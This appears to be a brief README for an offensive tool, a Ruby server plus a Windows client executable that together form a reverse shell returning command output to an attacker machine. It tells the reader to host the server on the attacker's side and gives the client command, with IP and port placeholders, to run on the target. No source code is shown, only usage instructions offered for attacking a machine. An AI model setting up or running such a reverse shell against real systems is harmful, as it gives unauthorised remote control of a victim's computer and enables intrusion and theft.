# Reverse Shell With Getting Output From Windows

These are scripts/exes that can be used as a better reverse shell. It's basically a reverse shell that sends the output of the executions back to you which wouldn't be possible with netcat.

Host the shell_server.rb on the attacker machine and then use the shell_client.exe / shell_client.rb to connect to it by calling it with these arguments on the target.

```
.\shell_client.exe *IP* *PORT*
```
